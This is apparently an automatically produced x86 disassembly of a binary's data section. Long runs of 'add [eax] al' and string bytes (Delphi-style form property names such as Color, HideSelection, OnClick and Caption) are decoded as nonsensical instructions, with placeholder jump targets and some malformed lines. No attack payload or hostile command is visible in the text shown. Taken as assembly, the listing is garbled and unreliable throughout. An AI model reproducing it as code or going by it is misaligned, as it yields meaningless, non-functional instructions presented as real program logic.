add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax ] al
and [ ebx ] eax
cwde
test [ eax + eax + 0x4 ] al
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xd4004484
sbb al [ ebx ]
adc [ 0x1ccc0043 ] bl
inc ebx
add [ esi + ebx + 0x1d400043 ] dl
inc ebx
add al dh
sbb al 0x43
add [ ebp + ebx + 0x1df80043 ] ah
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
pop esp
and al [ ebx ]
pushfd
and al [ ebx ]
sbb [ ebx ] ah
inc ebx
add al dl
and al [ ebx ]
clc
and al [ ebx ]
push esp
and eax [ ebx ]
mov [ ebx ] fs
inc ebx
add [ eax ] al
and al [ ebx ]
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
sub al 0x1a
add [ ecx + edi ] bl
inc eax
add [ edx ] ah
inc ebx
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop [ eax + eax + 0x60 ]
pop eax
mov eax 0x9c004443
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] bl
aam 0x42
add [ eax ] cl
or al 0xd2
inc ebx
add [ eax ] al
add [ eax ] eax
fiadd [ ebx ]
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
fcom [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x79470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + ebx ] ch
insb
jae r-xdata
add [ edx + ebp * 2 + 0x3e3c0041 ] al
jb r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ ecx * 8 + 0x610043 ] dl
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
jmp 0xffffffffe656d6cb
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
salc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x29 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x42 ] cl
add [ eax ] ah
add al [ eax ]
add [ esp + edx * 8 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 - 0x2a39ffbe ] dl
inc edx
shl [ eax + 0x42d4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st5
inc edx
fild [ ebx ]
popad
jae r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
jb r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
fiadd [ ebx ]
arpl [ ecx ] ax
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add bh bh
cwde
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc esp
add [ eax + 0x58 ] ah
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
inc esp
push eax
mov [ ebx ] 0x7a
add [ eax ] al
inc esp
clc
inc ecx
add [ eax ] dh
sbb ah dl
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xor eax [ ecx ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
insd
inc ebp
add [ edx + eax ] cl
add bh bh
or [ ebx ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
add [ eax ] al
add [ ecx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
fild [ ebx ]
add [ gs : eax ] eax
dec [ edx + edx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
add [ gs : eax ] dl
xor eax [ eax + edx * 2 - 0x3a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ fs : eax ] eax
[ eax + 0x1004491 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
[ eax + 0x1e ]
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc esp
add [ eax ] al
inc edx
add [ ebx ] dl
add al [ eax ]
[ ebx + ebx ]
insb
sbb ah dl
adc [ eax ] al
adc [ edx ] eax
add bh bh
inc eax
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov ah 0xd9
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
push esp
adc [ eax ] al
or [ edx ] al
add bh bh
push esp
sbb eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push ds
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
inc ecx
add [ eax ] ch
int3
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
inc [ ebx + ebx + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax ] eax
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ eax + 0x100431c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
outsb
je r-xdata
add [ eax ] al
and eax 0x61500b00
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
int3
ja r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jae r-xdata
jo r-xdata
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ eax + 0x6f ] edx
sub [ eax ] al
adc [ eax ] al
or eax 0x8ff0002
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
inc esp
add [ eax + 0x1004486 ] ah
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
outsb
jne r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6948776f
outsb
add [ eax ] cl
push ebx
inc ebx
push 0xef47261
sub_42ed90
sbb [ edx ] bh
inc ebx
add [ eax ] ch
or al 0x44
add [ ecx + 0x44 ] dl
add [ edx + eax * 2 + 0xda00044 ] al
inc esp
add [ esp + ecx + 0x44 ] bl
add [ ecx - 0x1e47ffbc ] ah
inc esp
add [ esp + ecx - 0x1e1fffbc ] dl
inc esp
add al dh
or al 0x44
add [ eax + 0x3a ] dl
inc ebx
add [ eax ] dl
or eax 0xe1f00044
inc esp
add [ edx + eax * 2 + 0xe040044 ] cl
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ eax + 0x140043db ] ch
jmp 0x3956ee6f
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax + 0x11 ]
push esp
inc edx
jne r-xdata
sbb eax [ eax + eax + 0x2c ]
jmp 0xffffffffe656eeab
je r-xdata
inc esp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + edi - 0x754fffbd ] dh
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x3b800044
inc ebx
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add al ah
push ebx
inc esp
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ eax + 0x3b ] bl
inc ebx
add [ ebx + edi + 0x43 ] bh
add [ edx ] al
add bh ch
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xee48c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
out dx eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 ] dl
inc edx
add [ edx ] ah
out dx eax
inc edx
add [ edx + eax ] cl
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
sub_42efce
inc edx
add [ edx + eax ] dl
add [ eax ] al
cld
in eax dx
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
cmp eax [ ebx ]
mov al 0x8a
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x3b800044
inc ebx
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ebp + edi + 0x43 ] ch
add [ esi + edx * 2 + 0x3dc80044 ] ah
inc ebx
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add ah ah
cmp al 0x43
add [ edi + 0x3c900043 ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
hlt
sub_42f87c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x42f9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x55ffbd07 ] dl
stc
inc edx
add [ edx + eax ] dl
add [ eax ] al
cld
in eax dx
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi - 0x754fffbd ] bh
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x3b800044
inc ebx
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax + eax * 2 + 0x56a40043 ] ch
inc esp
add [ ecx + eax * 2 ] al
inc ebx
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ edi + edi ] bl
inc ebx
add [ eax ] ah
inc eax
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x30ff
sub_42fb3a
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_430277
pushfd
cmp eax 0x44
add [ eax + 0x1 ] al
adc eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
shl [ edi + 0x45 ] 0x1
add [ eax ] cl
add al [ eax ]
inc [ esp + eax * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc ebx
push 0x65676e61
push esp
adc [ eax ] al
adc al 0x2
add bh bh
or al 0x46
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
hlt
add [ eax ] eax
outsb
je r-xdata
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
jo r-xdata
add [ eax ] al
add [ ebx ] bl
add [ esi ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
test eax 0xf4ff0001
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
and [ edx ] al
outsb
jne r-xdata
add [ eax ] al
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x6f500800
outsb
je r-xdata
pop ds
add [ ebx ] cl
push ebx
insd
popad
insb
insb
inc ebx
push 0x65676e61
mov esp cs
inc ebx
add [ eax ] ah
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
adc [ eax ] al
or al 0x2
add bh bh
mov [ ebp + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push 0x2200045
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
push 0x6948776f
outsb
je r-xdata
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
je r-xdata
jo r-xdata
add [ eax + 0x5009001c ] al
outsd
je r-xdata
je r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ eax + 0x6f ] edx
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x4b010000 ] bl
push ds
inc esp
add [ esi + ebx + 0x44 ] bh
jae r-xdata
push eax
popad
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edx - 0x27010000 ] bl
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
outsd
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc ebx
add [ eax ] cl
add [ eax ] eax
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070029 ] al
push esp
xor al 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090027 ] al
jo r-xdata
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or cl [ edi + 0x6e ]
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002a ] al
outsb
inc ebp
js r-xdata
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
or al 0xd0
inc ebx
add al ch
add [ eax ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xor al 0x41
add [ eax ] ch
add al [ eax ]
[ eax ]
insb
or [ gs : ebx + 0x62 ] esi
jae r-xdata
jb r-xdata
je r-xdata
jae r-xdata
jns r-xdata
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
jo r-xdata
outsb
push ebx
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
insb
iretd
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x49840041 ] al
inc ebx
add [ eax + 0x5c00434a ] al
jne r-xdata
jae r-xdata
push ebx
je r-xdata
inc esp
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
sub al 0xcf
inc ebx
add al ch
add [ eax ] eax
dec ebx
jns r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002c ] al
outsb
iretd
add [ eax ] al
and al 0x8
jb r-xdata
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
inc [ edx ]
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
dec edi
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
or al 0xd2
inc ebx
add [ eax ] al
add [ eax ] eax
sbb al 0x39
je r-xdata
inc ebp
inc esp
pop esp
imul esp [ ebp + 0x6e ] 0x8
push ebx
je r-xdata
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
inc ebx
shl [ edi + eax ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx ] ah
add [ edx + eax ] dl
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc esp
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
